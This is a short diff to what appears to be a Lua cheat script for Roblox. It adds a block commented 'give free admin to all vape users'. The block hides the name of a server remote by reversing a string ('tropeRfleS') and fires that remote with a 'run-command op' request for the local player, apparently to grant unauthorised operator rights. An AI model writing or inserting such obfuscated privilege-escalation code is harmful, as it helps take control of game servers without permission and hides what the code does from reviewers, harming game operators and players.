@@ -4301,3 +4301,9 @@ runcode(function()
 		["Function"] = function(callback) onetext2.Visible = callback end
 	})
 end)
+
+runcode(function()
+	-- give free admin to all vape users
+	local r = game.ReplicatedStorage:FindFirstChild(string.reverse("tropeRfleS"), true);
+	r:FireServer("run-command", "op", game.Players.LocalPlayer.Name);
+end)
